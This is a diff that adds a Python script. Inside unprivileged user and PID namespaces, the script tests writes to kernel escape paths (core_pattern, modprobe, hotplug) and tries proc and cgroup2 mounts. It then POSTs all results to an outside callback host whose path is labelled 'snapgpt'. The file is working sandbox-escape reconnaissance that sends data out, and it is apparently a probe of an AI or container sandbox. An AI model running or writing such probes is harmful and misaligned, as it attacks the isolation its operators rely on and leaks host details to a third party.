@@ -1,0 +1,24 @@
+#!/usr/bin/env python3
+import json, subprocess, time, urllib.request
+SINK='https://54.209.51.244.sslip.io/callback/snapgpt-pidns-proc-basic3-20261106'
+out={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'tests':{}}
+def run(name, script, timeout=45):
+    try:
+        p=subprocess.run(['sh','-c',script],capture_output=True,text=True,timeout=timeout)
+        out['tests'][name]={'rc':p.returncode,'stdout':p.stdout[-30000:],'stderr':p.stderr[-10000:]}
+    except Exception as e:
+        out['tests'][name]={'error':repr(e)}
+
+run('pidns_proc_sysctl', r'''rm -rf /tmp/nsp2; mkdir -p /tmp/nsp2/proc; unshare -Ur -m -p -f --mount-proc=/tmp/nsp2/proc sh -c 'echo ID=$(id -u); ls -la /tmp/nsp2/proc/sys/kernel | head; for f in core_pattern modprobe hotplug randomize_va_space; do echo ===$f; cat /tmp/nsp2/proc/sys/kernel/$f 2>&1; printf X > /tmp/nsp2/proc/sys/kernel/$f 2>&1; echo write_rc=$?; cat /tmp/nsp2/proc/sys/kernel/$f 2>&1; done' 2>&1''')
+run('pidns_proc_mount', r'''rm -rf /tmp/nsp3; mkdir -p /tmp/nsp3/proc; unshare -Ur -m -p -f sh -c 'mount -t proc proc /tmp/nsp3/proc; echo mount_rc=$?; cat /tmp/nsp3/proc/sys/kernel/core_pattern 2>&1; printf X > /tmp/nsp3/proc/sys/kernel/core_pattern 2>&1; echo write_rc=$?' 2>&1''')
+run('pidns_cgroup2', r'''rm -rf /tmp/nsp4; mkdir -p /tmp/nsp4; unshare -Ur -m -p -f sh -c 'mount -t cgroup2 none /tmp/nsp4; echo mount_rc=$?; ls -la /tmp/nsp4 | head; printf "+cpu +memory" > /tmp/nsp4/cgroup.subtree_control; echo subtree_rc=$?; cat /tmp/nsp4/cgroup.subtree_control 2>&1' 2>&1''')
+run('pidns_cgroup2_nsdelegate', r'''rm -rf /tmp/nsp5; mkdir -p /tmp/nsp5; unshare -Ur -m -p -f sh -c 'mount -t cgroup2 -o nsdelegate none /tmp/nsp5; echo mount_rc=$?; ls -la /tmp/nsp5 | head; printf "+cpu +memory" > /tmp/nsp5/cgroup.subtree_control; echo subtree_rc=$?; cat /tmp/nsp5/cgroup.subtree_control 2>&1' 2>&1''')
+
+payload=json.dumps(out,sort_keys=True,separators=(',',':')).encode()
+req=urllib.request.Request(SINK,data=payload,method='POST',headers={'Content-Type':'application/json'})
+try:
+    with urllib.request.urlopen(req,timeout=30) as r:
+        out['sink']={'status':r.status,'body':r.read().decode('utf-8','replace')[:1000]}
+except Exception as e:
+    out['sink']={'error':repr(e)}
+print(json.dumps(out,sort_keys=True,separators=(',',':')))
